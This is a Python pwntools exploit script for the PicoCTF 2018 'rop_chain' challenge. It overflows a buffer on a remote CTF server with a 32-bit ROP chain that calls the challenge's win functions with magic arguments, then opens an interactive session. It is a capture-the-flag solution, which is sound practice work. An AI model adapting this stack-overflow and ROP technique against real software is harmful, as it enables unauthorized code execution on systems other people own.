from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./PicoCTF_2018_rop_chain')
#
io = remote('node5.buuoj.cn',28156)
elf=ELF('./PicoCTF_2018_rop_chain')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

ru('input> ')
win1=0x080485CB
win2=0x080485D8
a1=0xBAAAAAAD
fa=0x0804862B
a2=0xDEADBAAD
pl=b'aaaabbbbccccddddeeeeffffgggg'
pl+=p32(win1)+p32(win2)+p32(fa)
pl+=p32(a1)+p32(a2)#动态调试调出来的位置用a-z填充看位置
sl(pl)

#
io.interactive()
